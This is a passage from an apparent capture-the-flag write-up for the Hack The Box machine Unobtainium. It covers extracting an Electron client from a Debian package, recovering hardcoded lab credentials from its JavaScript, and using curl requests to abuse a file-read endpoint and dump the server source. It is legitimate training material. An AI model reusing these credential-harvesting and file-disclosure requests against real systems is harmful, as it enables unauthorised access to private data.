<span class="nb">ln</span> <span class="nt">-sf</span> <span class="s1">'/opt/unobtainium/unobtainium'</span> <span class="s1">'/usr/bin/unobtainium'</span>

<span class="c"># SUID chrome-sandbox for Electron 5+</span>
<span class="nb">chmod </span>4755 <span class="s1">'/opt/unobtainium/chrome-sandbox'</span> <span class="o">||</span> <span class="nb">true

</span>update-mime-database /usr/share/mime <span class="o">||</span> <span class="nb">true
</span>update-desktop-database /usr/share/applications <span class="o">||</span> <span class="nb">true</span>
</code></pre></div></div>

<p>It also creates a link to <code class="language-plaintext highlighter-rouge">/opt/unobtainium/unobtainium</code> in <code class="language-plaintext highlighter-rouge">/usr/bin</code>. This is the main binary for the application.</p>

<p><code class="language-plaintext highlighter-rouge">postrm</code> is just removing the link in <code class="language-plaintext highlighter-rouge">/usr/bin</code> (this is pretty poor cleanup):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="c"># Delete the link to the binary</span>
<span class="nb">rm</span> <span class="nt">-f</span> <span class="s1">'/usr/bin/unobtainium'</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">data.tar.xz</code> contains two directories, <code class="language-plaintext highlighter-rouge">opt</code> and <code class="language-plaintext highlighter-rouge">usr</code>. These are the files that will be dropped onto the installing system during install, and there’s too many to list here.</p>

<p><code class="language-plaintext highlighter-rouge">unobtainium_debian.zip</code> unpacks to look like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unobtainium_debian.zip
├── unobtainium_1.0.0_amd64.deb.md5sum
└── unobtainium_1.0.0_amd64.deb
    ├── debian-binary
    ├── control.tar.gz
    |   ├── postinst
    |   ├── postrm
    |   ├── control
    |   └── md5sums
    └── data.tar.xz
        ├── opt/
        └── usr/
</code></pre></div></div>

<h4 id="pull-source">Pull Source</h4>

<p>The <code class="language-plaintext highlighter-rouge">postinst</code> file suggested this was an <a href="https://www.electronjs.org/">Electron</a> application, which is a framework for building cross-platform desktop applications using JavaScript, HTML, and CSS. Tons of populate applications are built on Electron, like VSCode, Slack, Discord, Atom, Typora, and Mailspring.</p>

<p>I looked at an Electron app in a <code class="language-plaintext highlighter-rouge">.exe</code> file in the <a href="/holidayhack2020/3#point-of-sale-password-recovery">2020 Holiday Hack Challenge</a>. Just like in that case, to see the app source, I need to find the <code class="language-plaintext highlighter-rouge">app.asar</code> file:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-name</span> <span class="k">*</span>.asar
<span class="go">./opt/unobtainium/resources/app.asar
</span></code></pre></div></div>

<p>I’ll need the Node Package Manager (<code class="language-plaintext highlighter-rouge">apt install npm</code>) to install the ASAR tool (<code class="language-plaintext highlighter-rouge">npm install -g --engine-strict asar</code>). I’ll use it to pull the source from <code class="language-plaintext highlighter-rouge">app.asar</code> into a directory I named <code class="language-plaintext highlighter-rouge">app.js</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>asar extract opt/unobtainium/resources/app.asar app.js/
<span class="gp">oxdf@parrot$</span><span class="w"> </span>find app.js/ <span class="nt">-type</span> f
<span class="go">app.js/src/todo.html
app.js/src/index.html
app.js/src/js/feather.min.js
app.js/src/js/dashboard.js
app.js/src/js/get.js
app.js/src/js/Chart.min.js
app.js/src/js/todo.js
app.js/src/js/app.js
app.js/src/js/bootstrap.bundle.min.js
app.js/src/js/check.js
app.js/src/js/jquery.min.js
app.js/src/css/bootstrap.min.css
app.js/src/css/dashboard.css
app.js/src/get.html
app.js/src/post.html
app.js/package.json
app.js/index.js
</span></code></pre></div></div>

<h4 id="javascript-re">JavaScript RE</h4>

<p>Looking at the <code class="language-plaintext highlighter-rouge">package.json</code> file, it gives metadata about how the application starts by loading <code class="language-plaintext highlighter-rouge">index.js</code>:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"unobtainium"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.0.0"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"client"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"main"</span><span class="p">:</span><span class="w"> </span><span class="s2">"index.js"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"homepage"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://unobtainium.htb"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"author"</span><span class="p">:</span><span class="w"> </span><span class="s2">"felamos &lt;felamos@unobtainium.htb&gt;"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"license"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ISC"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">index.js</code> loads <code class="language-plaintext highlighter-rouge">src.index.html</code> into the window and handles exit:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">app</span><span class="p">,</span> <span class="nx">BrowserWindow</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">electron</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">path</span><span class="dl">'</span><span class="p">)</span>

<span class="kd">function</span> <span class="nf">createWindow</span> <span class="p">()</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">mainWindow</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BrowserWindow</span><span class="p">({</span>
  
    <span class="na">webPreferences</span><span class="p">:</span> <span class="p">{</span>
      <span class="na">devTools</span><span class="p">:</span> <span class="kc">false</span>
    <span class="p">}</span>
  <span class="p">})</span>

  <span class="nx">mainWindow</span><span class="p">.</span><span class="nf">loadFile</span><span class="p">(</span><span class="dl">'</span><span class="s1">src/index.html</span><span class="dl">'</span><span class="p">)</span>

<span class="p">}</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">whenReady</span><span class="p">().</span><span class="nf">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nf">createWindow</span><span class="p">()</span>

  <span class="nx">app</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">activate</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">BrowserWindow</span><span class="p">.</span><span class="nf">getAllWindows</span><span class="p">().</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="nf">createWindow</span><span class="p">()</span>
  <span class="p">})</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">window-all-closed</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if </span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">platform</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">darwin</span><span class="dl">'</span><span class="p">)</span> <span class="nx">app</span><span class="p">.</span><span class="nf">quit</span><span class="p">()</span>
<span class="p">})</span>
</code></pre></div></div>

<p>Because these apps are just HTML, I can open <code class="language-plaintext highlighter-rouge">index.html</code> in Firefox (<code class="language-plaintext highlighter-rouge">firefox index.html</code>). On the main page, it complains about not being able to reach unobtainium.html:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210408115638328.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210408115638328.png" alt="image-20210408115638328" class="include_image " />
</picture>

<p>That’s odd, since I have that in my <code class="language-plaintext highlighter-rouge">hosts</code> file. It seems like some of the functionality is broken. I’m guessing that’s related to looking in the browser and not through the app. Looking at the various JavaScript files in <code class="language-plaintext highlighter-rouge">src/js</code>, <code class="language-plaintext highlighter-rouge">check.js</code> seems to handle this check:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span><span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">http://unobtainium.htb:31337</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">HEAD</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">timeout</span><span class="p">:</span><span class="mi">1000</span><span class="p">,</span>
        <span class="na">statusCode</span><span class="p">:</span> <span class="p">{</span>
            <span class="mi">200</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
                
            <span class="p">},</span>
            <span class="mi">400</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Unable to reach unobtainium.htb</span><span class="dl">'</span><span class="p">);</span>
            <span class="p">},</span>
            <span class="mi">0</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Unable to reach unobtainium.htb</span><span class="dl">'</span><span class="p">);</span>
            <span class="p">}</span>              
        <span class="p">}</span>
 <span class="p">});</span>
</code></pre></div></div>

<p>A minor diversion to look at what’s happening. If I refresh the page with the Firefox dev tools open, I can see this single request:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210903094818685.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210903094818685.png" alt="image-20210903094818685" class="include_image " />
</picture>

<p>Clicking on it shows it’s actually a 200 response:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210903094841422.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210903094841422.png" alt="image-20210903094841422" class="include_image " />
</picture>

<p>But the error is “CORS Missing Allow Origin”. In the app, the requesting site would likely be unobtainium.htb. But in this context, it’s the file on my computer, so Firefox rejects it. So what status code does the JavaScript see? I’ll update <code class="language-plaintext highlighter-rouge">check.js</code> with a line to log the status code regardless of success:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span><span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">http://unobtainium.htb:31337</span><span class="dl">"</span><span class="p">,</span>                        
        <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">HEAD</span><span class="dl">"</span><span class="p">,</span>                           
        <span class="na">timeout</span><span class="p">:</span><span class="mi">1000</span><span class="p">,</span>    
        <span class="na">statusCode</span><span class="p">:</span> <span class="p">{</span>    
            <span class="mi">200</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>    
                                          
            <span class="p">},</span>    
            <span class="mi">400</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>    
                <span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Unable to reach unobtainium.htb</span><span class="dl">'</span><span class="p">);</span>    
            <span class="p">},</span>                                               
            <span class="mi">0</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>    
                <span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Unable to reach unobtainium.htb</span><span class="dl">'</span><span class="p">);</span>    
            <span class="p">}</span>                                                
        <span class="p">},</span>       
        <span class="na">complete</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>                
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Status code: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">response</span><span class="p">.</span><span class="nx">status</span><span class="p">);</span>    
        <span class="p">},</span>                                                      
 <span class="p">});</span>
</code></pre></div></div>

<p>Now on refreshing, it prints in the console:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210903095648829.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210903095648829.png" alt="image-20210903095648829" class="include_image " />
</picture>

<p>Status code 0 means the request was canceled.</p>

<p>Back in the code, <code class="language-plaintext highlighter-rouge">get.js</code> is a GET to the root on 31337:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
    <span class="na">url</span><span class="p">:</span> <span class="dl">'</span><span class="s1">http://unobtainium.htb:31337</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">get</span><span class="dl">'</span><span class="p">,</span>
    
    <span class="na">success</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#output</span><span class="dl">"</span><span class="p">).</span><span class="nf">html</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">});</span>
</code></pre></div></div>

<p>From enumeration above, that was just returning <code class="language-plaintext highlighter-rouge">[]</code>. That script is called from <code class="language-plaintext highlighter-rouge">get.html</code>, which is the left side menu item “Message Log”:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">grep </span>get.js <span class="k">*</span>.html
<span class="go">get.html:    &lt;script src="js/get.js"&gt;&lt;/script&gt;
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">app.js</code> does a put request to the root:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nf">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
    <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#but_submit</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
        <span class="kd">var</span> <span class="nx">message</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#message</span><span class="dl">"</span><span class="p">).</span><span class="nf">val</span><span class="p">().</span><span class="nf">trim</span><span class="p">();</span>
        <span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
        <span class="na">url</span><span class="p">:</span> <span class="dl">'</span><span class="s1">http://unobtainium.htb:31337/</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">put</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">dataType</span><span class="p">:</span><span class="dl">'</span><span class="s1">json</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">contentType</span><span class="p">:</span><span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">processData</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">({</span><span class="dl">"</span><span class="s2">auth</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">felamos</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Winter2021</span><span class="dl">"</span><span class="p">},</span> <span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span><span class="p">:</span> <span class="nx">message</span><span class="p">}}),</span>
        <span class="na">success</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">//$("#output").html(JSON.stringify(data));</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#output</span><span class="dl">"</span><span class="p">).</span><span class="nf">html</span><span class="p">(</span><span class="dl">"</span><span class="s2">Message has been sent!</span><span class="dl">"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">});</span>
<span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div>

<p>This file is loaded on <code class="language-plaintext highlighter-rouge">post.html</code>, which is the “Post Messages” menu option.</p>

<p><code class="language-plaintext highlighter-rouge">todo.js</code> has a POST request to <code class="language-plaintext highlighter-rouge">/todo</code>:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
    <span class="na">url</span><span class="p">:</span> <span class="dl">'</span><span class="s1">http://unobtainium.htb:31337/todo</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">post</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">dataType</span><span class="p">:</span><span class="dl">'</span><span class="s1">json</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">contentType</span><span class="p">:</span><span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">processData</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
    <span class="na">data</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">({</span><span class="dl">"</span><span class="s2">auth</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">felamos</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Winter2021</span><span class="dl">"</span><span class="p">},</span> <span class="dl">"</span><span class="s2">filename</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">todo.txt</span><span class="dl">"</span><span class="p">}),</span>
    <span class="na">success</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#output</span><span class="dl">"</span><span class="p">).</span><span class="nf">html</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">});</span>
</code></pre></div></div>

<p>Both of the last two include a username “felamos” and a password “Winter2021”. The <code class="language-plaintext highlighter-rouge">/todo</code> path also seems to be getting the contents of a file. I can recreate this last POST with <code class="language-plaintext highlighter-rouge">curl</code>:</p>

<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> http://unobtainium.htb:31337/todo <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "todo.txt"}'</span> | jq
<span class="go">{
  "ok": true,
  "content": "1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n"
}
</span></code></pre></div></div>

<h2 id="shell-as-root-in-default">Shell as root in default</h2>

<h3 id="lfi-in-todo">LFI in todo</h3>

<p>The last POST above sends <code class="language-plaintext highlighter-rouge">auth</code> and <code class="language-plaintext highlighter-rouge">filename</code> parameters. I want to test if there are limits on the file. I’ll go for <code class="language-plaintext highlighter-rouge">/etc/lab-release</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://unobtainium.htb:31337/todo <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "/etc/lsb-release"}'</span>
</code></pre></div></div>

<p>It just hangs and doesn’t return anything. This LFI is limited to the local folder.</p>

<p>I’ll try to find the server-side JS for this app. <code class="language-plaintext highlighter-rouge">nmap</code> showed it was running NodeJS / Express framework. It took a few guesses (<code class="language-plaintext highlighter-rouge">server.js</code>, <code class="language-plaintext highlighter-rouge">main.js</code>, etc), but eventually I got it with <code class="language-plaintext highlighter-rouge">index.js</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://unobtainium.htb:31337/todo <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "index.js"}'</span>
<span class="go">{"ok":true,"content":"var root = require(\"google-cloudstorage-commands\");\nconst express = require('express');\nconst { exec } = require(\"child_process\");     \nconst bodyParser = require('body-parser');     \nconst _ = require('lodash');                                                                  \nconst app = express();\nvar fs = require('fs');\n                                                                                              \nconst users = [                                                                               \n  {name: 'felamos', password: 'Winter2021'},\n  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},      \n];\n\nlet messages = [];                             \nlet lastId = 1;                                \n                                                                                              \nfunction findUser(auth) {                                                                     \n  return users.find((u) =&gt;                                                                    \n    u.name === auth.name &amp;&amp;                                                                   \n    u.password === auth.password);                                                            \n}                                    \n                                               \napp.use(bodyParser.json());                                                                   \n                                               \napp.get('/', (req, res) =&gt; {                   \n  res.send(messages);                                                                         \n});                                                                                           \n                                                                                              \napp.put('/', (req, res) =&gt; {   \n  const user = findUser(req.body.auth || {});                                                 \n                                               \n  if (!user) {                                 \n    res.status(403).send({ok: false, error: 'Access denied'});                                \n    return;\n  }\n\n  const message = {\n    icon: '__',\n  };\n\n  _.merge(message, req.body.message, {\n    id: lastId++,\n    timestamp: Date.now(),\n    userName: user.name,\n  });\n\n  messages.push(message);\n  res.send({ok: true});\n});\n\napp.delete('/', (req, res) =&gt; {\n  const user = findUser(req.body.auth || {});\n\n  if (!user || !user.canDelete) {\n    res.status(403).send({ok: false, error: 'Access denied'});\n    return;\n  }\n\n  messages = messages.filter((m) =&gt; m.id !== req.body.messageId);\n  res.send({ok: true});\n});\napp.post('/upload', (req, res) =&gt; {\n  const user = findUser(req.body.auth || {});\n  if (!user || !user.canUpload) {\n    res.status(403).send({ok: false, error: 'Access denied'});\n    return;\n  }\n\n\n  filename = req.body.filename;\n  root.upload(\"./\",filename, true);\n  res.send({ok: true, Uploaded_File: filename});\n});\n\napp.post('/todo', (req, res) =&gt; {\n\tconst user = findUser(req.body.auth || {});\n\tif (!user) {\n\t\tres.status(403).send({ok: false, error: 'Access denied'});\n\t\treturn;\n\t}\n\n\tfilename = req.body.filename;\n        testFolder = \"/usr/src/app\";\n        fs.readdirSync(testFolder).forEach(file =&gt; {\n                if (file.indexOf(filename) &gt; -1) {\n                        var buffer = fs.readFileSync(filename).toString();\n                        res.send({ok: true, content: buffer});\n                }\n        });\n});\n\napp.listen(3000);\nconsole.log('Listening on port 3000...');\n"}
</span></code></pre></div></div>

<p>The formatting is a mess, but I’ll use <code class="language-plaintext highlighter-rouge">jq</code> to pull the string in <code class="language-plaintext highlighter-rouge">content</code> and print it raw (<code class="language-plaintext highlighter-rouge">-r</code>):</p>

<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> http://unobtainium.htb:31337/todo <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "index.js"}'</span> | jq <span class="nt">-r</span> <span class="s1">'.content'</span>
<span class="go">var root = require("google-cloudstorage-commands");
const express = require('express');                              
const { exec } = require("child_process");     
const bodyParser = require('body-parser')
...[snip]...
</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> http://unobtainium.htb:31337/todo <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "index.js"}'</span> | jq <span class="nt">-r</span> <span class="s1">'.content'</span> <span class="o">&gt;</span> index.js
</code></pre></div></div>

<p>On the second line above, I’ll save the source to a file for analayis.</p>

<h3 id="source-analysis">Source Analysis</h3>

<p>The source starts out with the <code class="language-plaintext highlighter-rouge">require</code> statements, which are like <code class="language-plaintext highlighter-rouge">import</code> in Python:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">root</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">google-cloudstorage-commands</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">exec</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">child_process</span><span class="dl">"</span><span class="p">);</span>     
<span class="kd">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">body-parser</span><span class="dl">'</span><span class="p">);</span>     
<span class="kd">const</span> <span class="nx">_</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">lodash</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p>Most of these are standard, but <code class="language-plaintext highlighter-rouge">google-cloudstorage-commands</code> is interesting. I’ll check that out soon.</p>

<p>It defines users, and has a function to retrieve these users based on a given <code class="language-plaintext highlighter-rouge">auth</code> structure.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">users</span> <span class="o">=</span> <span class="p">[</span>
  <span class="p">{</span><span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">felamos</span><span class="dl">'</span><span class="p">,</span> <span class="na">password</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Winter2021</span><span class="dl">'</span><span class="p">},</span>
  <span class="p">{</span><span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">,</span> <span class="na">password</span><span class="p">:</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">().</span><span class="nf">toString</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span> <span class="na">canDelete</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">canUpload</span><span class="p">:</span> <span class="kc">true</span><span class="p">},</span>      
<span class="p">];</span>
<span class="p">...[</span><span class="nx">snip</span><span class="p">]...</span>                              
<span class="kd">function</span> <span class="nf">findUser</span><span class="p">(</span><span class="nx">auth</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">users</span><span class="p">.</span><span class="nf">find</span><span class="p">((</span><span class="nx">u</span><span class="p">)</span> <span class="o">=&gt;</span>
    <span class="nx">u</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="nx">auth</span><span class="p">.</span><span class="nx">name</span> <span class="o">&amp;&amp;</span>
    <span class="nx">u</span><span class="p">.</span><span class="nx">password</span> <span class="o">===</span> <span class="nx">auth</span><span class="p">.</span><span class="nx">password</span><span class="p">);</span>
<span class="p">}</span>    
</code></pre></div></div>

<p>There are two hardcoded users, felamos and admin. I get the password for felamos there, but the admin password is random. The admin also has the <code class="language-plaintext highlighter-rouge">canDelete</code> and <code class="language-plaintext highlighter-rouge">canUpload</code> properties, which felamos does not have.</p>

<p>The rest is defining the routes to implement different functions. Some do a user check to see the username/password given (in <code class="language-plaintext highlighter-rouge">req.body.auth</code>) match one of the hardcoded users before allowing functionality:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>   
